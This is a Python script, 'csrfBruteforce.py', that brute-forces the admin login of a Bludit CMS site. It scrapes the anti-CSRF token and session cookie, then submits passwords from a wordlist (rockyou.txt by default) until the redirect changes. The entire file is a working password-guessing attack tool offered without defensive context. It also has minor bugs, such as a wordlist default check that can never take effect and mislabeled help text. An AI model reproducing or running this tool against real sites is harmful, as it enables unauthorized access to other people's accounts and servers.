import requests
import re
import argparse
import os

def parserss():
    parser = argparse.ArgumentParser(prog='csrfBruteforce.py',description='Anti-CSRF token Bruteforce')
    parser.add_argument("-u", "--url", dest="targeturl", help="Enter Login URL", required=True)
    parser.add_argument("-w", "--wordlist", dest="wordlist", help="EEnter wordlist")
    parser.add_argument("-k", "--user", dest="username", help="Enter Login URL", required=True)
    args = parser.parse_args()
    return args

def getCSRF(target_url):
    print("Fetching CSRF token & Cookie")
    req= requests.get(target_url)
    data = str(req.content)

    fetchtoken = re.search('(?<=input type="hidden" id="jstokenCSRF" name="tokenCSRF" value=")[^."]*', data)
    token = fetchtoken.group(0)
    cookie = req.headers['Set-Cookie']

    return cookie,token

def attack(username, password, target_url):

    cooki, tok = getCSRF(target_url) 
    cookievalue = re.search('(?<=BLUDIT-KEY=)[^;]*', cooki).group(0)
    data = {'tokenCSRF': tok, 'username': username, 'password': password, 'save': ''}

    print("Trying: {}".format(password))
    print(cookievalue)
    
    req = requests.post(target_url, data=data, cookies={"BLUDIT-KEY": cookievalue} )
    if req.headers['Location'] != "/admin/login":
        print("[+] Password found: {} !!!!!!!!".format(password))
    else:
        pass


if __name__ == '__main__':

    options = parserss()
    target_url = options.targeturl
    wordlist = os.path.abspath(options.wordlist)
    username = options.username

    if wordlist == None:
        wordlist = '/usr/share/wordlists/rockyou.txt'

    with open(wordlist, "r") as list:
        passwords = list.readlines()
        for i in passwords:
            word = i.strip()
            attack(username, word, target_url)
    print("[!] Bruteforce Complete")

